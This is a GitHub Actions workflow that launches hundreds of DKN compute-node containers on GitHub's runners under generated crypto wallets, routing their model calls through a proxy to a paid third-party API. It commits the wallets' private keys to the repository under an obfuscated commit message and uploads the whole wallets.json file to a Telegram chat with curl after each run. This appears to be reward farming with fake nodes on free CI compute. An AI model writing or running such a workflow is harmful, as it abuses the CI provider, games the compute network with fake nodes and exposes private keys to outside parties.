name: ğŸš€ DKN Compute Runtime

on:
  workflow_dispatch:
  
  schedule:
    # Every 6 hours, at minute 15
    - cron: '15 */5 * * *'

permissions:
  contents: write  # Need write for git commit
  actions: read

jobs:
  runtime:
    name: ğŸ–¥ï¸ Run DKN Compute Nodes
    runs-on: ubuntu-latest
    timeout-minutes: 360
    
    env:
      # ============================================
      # ğŸ”§ CONFIGURATION (EDIT HERE)
      # ============================================
      WALLET_COUNT: '5'
      CONTAINERS_PER_WALLET: '125'
      RUNTIME_HOURS: '5.5'
      REUSE_WALLETS: 'true'
      
      BATCH_SIZE: '20'
      PAUSE_SECONDS: '60'
      PROXY_PORT: '14441'
      
    steps:
      # ============================================
      # ğŸ“¦ SETUP
      # ============================================
      
      - name: ğŸ“¦ Checkout Repository
        uses: actions/checkout@v4
        with:
          token: ${{ secrets.GITHUB_TOKEN }}
          fetch-depth: 0
      
      - name: ğŸ”§ Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
          cache-dependency-path: |
            proxy/package-lock.json
            scripts/package-lock.json
      
      - name: ğŸ“Š Display Configuration
        run: |
          echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
          echo "ğŸ¯ Configuration"
          echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
          echo "Trigger: ${{ github.event_name }}"
          echo "Wallet Count: $WALLET_COUNT"
          echo "Containers/Wallet: $CONTAINERS_PER_WALLET"
          echo "Total: $(( $WALLET_COUNT * $CONTAINERS_PER_WALLET ))"
          echo "Runtime: $RUNTIME_HOURS hours"
          echo "Reuse Wallets: $REUSE_WALLETS"
          echo ""
          echo "System:"
          echo "OS: $(lsb_release -d | cut -f2)"
          echo "RAM: $(free -h | awk '/^Mem:/ {print $2}')"
          echo "Docker: $(docker --version | cut -d' ' -f3 | cut -d',' -f1)"
          echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
      
      # ============================================
      # ğŸ’° WALLET MANAGEMENT (GIT VERSION)
      # ============================================
      
      - name: ğŸ’° Handle Wallets
        id: wallets
        run: |
          WALLET_FILE="wallets.json"
          
          # Check if wallets.json exists in repo
          if [[ "$REUSE_WALLETS" == "true" && -f "$WALLET_FILE" ]]; then
            echo "â™»ï¸  Reusing wallets from repository"
            echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
            
            ACTUAL_COUNT=$(jq '. | length' $WALLET_FILE)
            echo "âœ… Loaded $ACTUAL_COUNT wallets from repo"
            echo "ğŸ“… Wallets are version controlled (git)"
            
          else
            echo "ğŸ†• Generating new wallets"
            echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
            
            cd scripts
            [ ! -d "node_modules" ] && npm install
            node crypto-generator.js $WALLET_COUNT
            mv wallets.json ../$WALLET_FILE
            cd ..
            
            ACTUAL_COUNT=$WALLET_COUNT
            echo "âœ… Generated $ACTUAL_COUNT new wallets"
          fi
          
          echo "wallet_count=$ACTUAL_COUNT" >> $GITHUB_OUTPUT
          
          echo ""
          echo "ğŸ“‹ First wallet preview:"
          jq '.[0] | {address: .address, private_key: (.private_key[:10] + "..." + .private_key[-6:])}' $WALLET_FILE
          echo ""
          echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
      
      # ============================================
      # ğŸ’¾ COMMIT WALLETS TO REPO
      # ============================================
      
      - name: ğŸ’¾ Commit Wallets to Repository
        if: always()
        run: |
          echo "ğŸ’¾ Saving wallets to repository..."
          echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
          
          # Configure git
          git config --local user.email "github-actions[bot]@users.noreply.github.com"
          git config --local user.name "github-actions[bot]"
          
          # Check if wallets.json exists
          if [ ! -f "wallets.json" ]; then
            echo "âš ï¸  wallets.json not found, skipping commit"
            exit 0
          fi
          
          # Add wallets.json
          git add wallets.json
          
          # Check if there are changes
          if git diff --staged --quiet; then
            echo "â„¹ï¸  No changes to wallets.json"
            echo "   Wallets already up-to-date in repo"
          else
            # Commit changes
            WALLET_COUNT=$(jq '. | length' wallets.json)
            git commit -m "ğŸ”„ Aut0-upd4te  ) [run- #${{ github.run_number }}]"
            
            # Push to repo
            git push
            
            echo "âœ… Wallets committed to repository"
            echo "ğŸ“Š Wallets: $WALLET_COUNT"
            echo "ğŸ”’ Repo: Private (secure)"
            echo "ğŸ“… Commit: Run #${{ github.run_number }}"
          fi
          
          echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
      
      # ============================================
      # ğŸŒ PROXY SETUP
      # ============================================
      
      - name: ğŸ“¦ Install Proxy Dependencies
        working-directory: ./proxy
        run: |
          echo "ğŸ“¦ Installing proxy dependencies..."
          npm ci --production
          echo "âœ… Installed"
      
      - name: âš™ï¸ Configure Proxy
        working-directory: ./proxy
        run: |
          echo "âš™ï¸  Creating .env file..."
          
          cat > .env << EOF
          NOVITA_API_KEYS=${{ secrets.NOVITA_API_KEYS }}
          MODEL_MAP={"llama3.2:1b-instruct-q4_K_M":"meta-llama/llama-3.2-1b-instruct","llama3.1:8b-instruct-q4_K_M":"meta-llama/llama-3.1-8b-instruct","qwen3:8b":"qwen/qwen3-8b-fp8","gemma3:12b":"google/gemma-3-12b-it","gemma3:27b":"google/gemma-3-27b-it","qwen3:32b":"qwen/qwen3-32b-fp8","llama3.3:70b-instruct-q4_K_M":"meta-llama/llama-3.3-70b-instruct"}
          PORT=$PROXY_PORT
          RL_MODE=provider_only
          NOVITA_RPM_PER_KEY=0
          NOVITA_RPS_PER_KEY=0
          PROXY_MIN_TPS=15
          REQUEST_TIMEOUT_MS=120000
          NODE_ENV=production
          EOF
          
          echo "âœ… Configured"
      
      - name: ğŸš€ Start Proxy
        working-directory: ./proxy
        run: |
          echo "ğŸš€ Starting proxy server..."
          
          nohup node index.js > proxy.log 2>&1 &
          echo $! > proxy.pid
          
          echo "â³ Waiting for proxy..."
          for i in {1..30}; do
            if curl -sf http://localhost:$PROXY_PORT/health > /dev/null 2>&1; then
              echo "âœ… Proxy ready"
              break
            fi
            [ $i -eq 30 ] && echo "âŒ Failed" && tail -20 proxy.log && exit 1
            sleep 1
          done
      
      - name: ğŸ§ª Test Proxy
        run: |
          echo "ğŸ§ª Testing proxy..."
          
          HEALTH=$(curl -s http://localhost:$PROXY_PORT/health)
          if echo "$HEALTH" | jq -e '.ok == true' > /dev/null; then
            echo "âœ… Test passed"
          else
            echo "âŒ Test failed"
            exit 1
          fi
      
      # ============================================
      # ğŸ³ DOCKER DEPLOYMENT
      # ============================================
      
      - name: ğŸ³ Setup Docker
        run: |
          echo "ğŸ³ Setting up Docker..."
          docker network create dria-nodes 2>/dev/null || true
          docker pull firstbatch/dkn-compute-node:latest
          echo "âœ… Ready"
      
      - name: ğŸš€ Deploy Containers
        id: deploy
        run: |
          echo "ğŸš€ Deploying containers..."
          echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
          
          ACTUAL_COUNT=$(jq '. | length' wallets.json)
          TOTAL=$(( $ACTUAL_COUNT * $CONTAINERS_PER_WALLET ))
          
          echo "Deploying $TOTAL containers..."
          
          DKN_MODELS="${{ secrets.DKN_MODELS }}"
          [ -z "$DKN_MODELS" ] && DKN_MODELS="gemma3:12b,gemma3:27b,qwen3:32b,llama3.3:70b-instruct-q4_K_M"
          
          STARTED=0
          
          for (( w=0; w<$ACTUAL_COUNT; w++ )); do
            ADDRESS=$(jq -r ".[$w].address" wallets.json)
            PRIVKEY=$(jq -r ".[$w].private_key" wallets.json)
            PRIVKEY="${PRIVKEY#0x}"
            ADDR_SHORT="${ADDRESS:2:6}"
            
            for (( i=1; i<=$CONTAINERS_PER_WALLET; i++ )); do
              NAME="compute_node_w$((w+1))_${ADDR_SHORT}_$(printf '%02d' $i)"
              
              docker ps -aq -f name="^${NAME}$" | xargs -r docker rm -f > /dev/null 2>&1
              
              if docker run -d \
                --name "$NAME" \
                --network dria-nodes \
                --restart on-failure:3 \
                -e DKN_WALLET_SECRET_KEY="$PRIVKEY" \
                -e DKN_MODELS="$DKN_MODELS" \
                -e OLLAMA_HOST="http://host.docker.internal" \
                -e OLLAMA_PORT="$PROXY_PORT" \
                -e OLLAMA_AUTO_PULL="false" \
                --add-host host.docker.internal:host-gateway \
                firstbatch/dkn-compute-node:latest > /dev/null 2>&1; then
                STARTED=$((STARTED + 1))
              fi
              
              if (( STARTED % $BATCH_SIZE == 0 )); then
                echo "Progress: $STARTED/$TOTAL"
                sleep $PAUSE_SECONDS
              fi
            done
          done
          
          echo ""
          echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
          echo "âœ… Deployed $STARTED containers"
          echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
          
          echo "started=$STARTED" >> $GITHUB_OUTPUT
      
      # ============================================
      # ğŸ“± TELEGRAM NOTIFICATION #1: DEPLOYMENT
      # ============================================
      
      - name: ğŸ“± Send Deployment Success Notification
        if: success()
        env:
          BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
            echo "âš ï¸  Telegram not configured, skipping"
            exit 0
          fi
          
          echo "ğŸ“± Sending deployment notification..."
          
          # Get wallet info
          WALLET_COUNT=$(jq '. | length' wallets.json)
          FIRST_WALLET=$(jq -r '.[0].address' wallets.json)
          
          # Get container stats
          RUNNING=$(docker ps --filter "name=compute_node" --filter "status=running" | wc -l)
          RUNNING=$((RUNNING - 1))
          
          TOTAL=$(docker ps -a --filter "name=compute_node" | wc -l)
          TOTAL=$((TOTAL - 1))
          
          # Calculate success rate
          if [ "$TOTAL" -gt 0 ]; then
            SUCCESS_RATE=$(( RUNNING * 100 / TOTAL ))
          else
            SUCCESS_RATE=0
          fi
          
          # Detect trigger type
          TRIGGER="${{ github.event_name }}"
          if [ "$TRIGGER" = "schedule" ]; then
            TRIGGER_TEXT="Auto-Schedule"
          else
            TRIGGER_TEXT="Manual"
          fi
          
          # Get GitHub username (owner)
          GITHUB_USER=$(echo "${{ github.repository }}" | cut -d'/' -f1)
          
          # Get full repo URL
          REPO_URL="https://github.com/${{ github.repository }}"
          
          # Construct message
          MESSAGE="ğŸš€ *Deployment Complete!*

          ğŸ³ Containers: \`$RUNNING/$TOTAL\` ($SUCCESS_RATE%)
          ğŸ’° Wallets: \`$WALLET_COUNT\`
          ğŸ“ First: \`${FIRST_WALLET:0:10}...${FIRST_WALLET: -8}\`
          ğŸ”„ Trigger: $TRIGGER_TEXT
          ğŸ“¦ Repo: $REPO_URL
          #ï¸âƒ£ Run: \`#${{ github.run_number }}\`

          â±ï¸ Runtime: $RUNTIME_HOURS hours
          ğŸ”— [View Run](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})"
          
          # Send text message
          echo "ğŸ“¤ Sending message..."
          SEND_MSG=$(curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
            -d chat_id="${CHAT_ID}" \
            -d parse_mode="Markdown" \
            -d disable_web_page_preview=true \
            -d text="$MESSAGE")
          
          MSG_OK=$(echo "$SEND_MSG" | jq -r '.ok')
          if [ "$MSG_OK" = "true" ]; then
            echo "âœ… Message sent"
          else
            echo "âŒ Failed to send message"
            echo "Response: $SEND_MSG"
          fi
          
          # Send wallets.json file with GitHub username
          if [ -f "wallets.json" ]; then
            echo "ğŸ“¤ Sending wallets.json file..."
            
            # Rename file with GitHub username
            USER_WALLET_FILE="${GITHUB_USER}-wallets.json"
            cp wallets.json "$USER_WALLET_FILE"
            
            CAPTION="ğŸ’° $WALLET_COUNT wallets | Run #${{ github.run_number }}"
            
            SEND_DOC=$(curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
              -F chat_id="${CHAT_ID}" \
              -F document=@"$USER_WALLET_FILE" \
              -F caption="$CAPTION")
            
            DOC_OK=$(echo "$SEND_DOC" | jq -r '.ok')
            if [ "$DOC_OK" = "true" ]; then
              echo "âœ… File sent as: $USER_WALLET_FILE"
            else
              echo "âŒ Failed to send file"
              echo "Response: $SEND_DOC"
            fi
            
            # Cleanup temp file
            rm -f "$USER_WALLET_FILE"
          else
            echo "âš ï¸  wallets.json not found"
          fi
          
          echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
          echo "âœ… Deployment notification completed"
      
      # ============================================
      # â° RUNTIME
      # ============================================
      
      - name: â° Runtime Period
        run: |
          echo "â° Starting runtime period..."
          
          RUNTIME_SEC=$(echo "$RUNTIME_HOURS * 3600" | bc | cut -d. -f1)
          START=$(date +%s)
          END=$((START + RUNTIME_SEC))
          
          echo "Runtime: $RUNTIME_HOURS hours"
          echo "Start: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
          echo "End: $(date -u -d "@$END" '+%Y-%m-%d %H:%M:%S UTC')"
          echo ""
          
          while [ $(date +%s) -lt $END ]; do
            sleep 60
          done
          
          echo "âœ… Runtime completed"
      
      # ============================================
      # ğŸ›‘ SHUTDOWN
      # ============================================
      
      - name: ğŸ›‘ Shutdown
        if: always()
        run: |
          echo "ğŸ›‘ Shutting down..."
          
          docker ps -q -f name=compute_node | xargs -r docker stop -t 10
          docker ps -aq -f name=compute_node | xargs -r docker rm -f
          docker network rm dria-nodes 2>/dev/null || true
          [ -f proxy/proxy.pid ] && kill $(cat proxy/proxy.pid) 2>/dev/null || true
          
          echo "âœ… Cleaned up"
      
      # ============================================
      # ğŸ“¦ ARTIFACTS (LOGS ONLY)
      # ============================================
      
      - name: ğŸ“¦ Save Logs to Artifacts
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: logs-${{ github.run_id }}
          path: proxy/proxy.log
          retention-days: 7
          if-no-files-found: warn
      
      # ============================================
      # ğŸ“± TELEGRAM NOTIFICATION #2: COMPLETE
      # ============================================
      
      - name: ğŸ“± Send Final Success Notification
        if: success()
        env:
          BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
            echo "â„¹ï¸  Telegram not configured, skipping"
            exit 0
          fi
          
          echo "ğŸ“± Sending completion notification..."
          
          # Get wallet info
          WALLET_COUNT=$(jq '. | length' wallets.json 2>/dev/null || echo "0")
          
          # Get GitHub username (owner)
          GITHUB_USER=$(echo "${{ github.repository }}" | cut -d'/' -f1)
          
          # Get full repo URL
          REPO_URL="https://github.com/${{ github.repository }}"
          
          # Duration
          DURATION="$RUNTIME_HOURS hours"
          
          # Construct message
          MESSAGE="ğŸ‰ *Runtime Complete!*

          ğŸ“¦ Repo: $REPO_URL
          #ï¸âƒ£ Run: \`#${{ github.run_number }}\`
          â±ï¸ Duration: \`$DURATION\`
          ğŸ’° Wallets: \`$WALLET_COUNT\`
          ğŸ³ Containers: \`$(( $WALLET_COUNT * $CONTAINERS_PER_WALLET ))\`

          âœ… All tasks completed successfully

          ğŸ”— [View Run](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})"
          
          # Send text message
          echo "ğŸ“¤ Sending message..."
          SEND_MSG=$(curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
            -d chat_id="${CHAT_ID}" \
            -d parse_mode="Markdown" \
            -d disable_web_page_preview=true \
            -d text="$MESSAGE")
          
          MSG_OK=$(echo "$SEND_MSG" | jq -r '.ok')
          if [ "$MSG_OK" = "true" ]; then
            echo "âœ… Message sent"
          else
            echo "âŒ Failed to send message"
          fi
          
          # Send wallets.json file with GitHub username
          if [ -f "wallets.json" ]; then
            echo "ğŸ“¤ Sending wallets file..."
            
            # Rename file with GitHub username
            USER_WALLET_FILE="${GITHUB_USER}-wallets.json"
            cp wallets.json "$USER_WALLET_FILE"
            
            CAPTION="ğŸ’° $WALLET_COUNT wallets | Run #${{ github.run_number }}"
            
            SEND_DOC=$(curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
              -F chat_id="${CHAT_ID}" \
              -F document=@"$USER_WALLET_FILE" \
              -F caption="$CAPTION")
            
            DOC_OK=$(echo "$SEND_DOC" | jq -r '.ok')
            if [ "$DOC_OK" = "true" ]; then
              echo "âœ… File sent as: $USER_WALLET_FILE"
            else
              echo "âŒ Failed to send file"
            fi
            
            # Cleanup temp file
            rm -f "$USER_WALLET_FILE"
          else
            echo "âš ï¸  wallets.json not found"
          fi
          
          echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
          echo "âœ… Completion notification sent"
      
      # ============================================
      # ğŸ“± TELEGRAM NOTIFICATION #3: FAILURE
      # ============================================
      
      - name: ğŸ“± Send Failure Notification
        if: failure()
        env:
          BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
            exit 0
          fi
          
          echo "ğŸ“± Sending failure notification..."
          
          # Get full repo URL
          REPO_URL="https://github.com/${{ github.repository }}"
          
          # Get current timestamp
          CURRENT_TIME=$(date -u '+%Y-%m-%d %H:%M UTC')
          
          # Detect trigger
          TRIGGER="${{ github.event_name }}"
          if [ "$TRIGGER" = "schedule" ]; then
            TRIGGER_TEXT="Auto"
          else
            TRIGGER_TEXT="Manual"
          fi
          
          # Construct message
          MESSAGE="ğŸš¨ *ERROR ALERT*

          *STATUS*
          â”œâ”€ State: Failed
          â”œâ”€ Exit Code: 1
          â””â”€ Duration: Check logs

          *CONTEXT*
          â”œâ”€ Repo: $REPO_URL
          â”œâ”€ Run: \`#${{ github.run_number }}\`
          â”œâ”€ Trigger: $TRIGGER_TEXT
          â””â”€ Time: $CURRENT_TIME

          *ACTION REQUIRED*
          â””â”€ Check logs for details

          ğŸ” [View Logs](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})"
          
          # Send message
          curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
            -d chat_id="${CHAT_ID}" \
            -d parse_mode="Markdown" \
            -d disable_web_page_preview=true \
            -d text="$MESSAGE" > /dev/null
          
          echo "âœ… Failure notification sent"
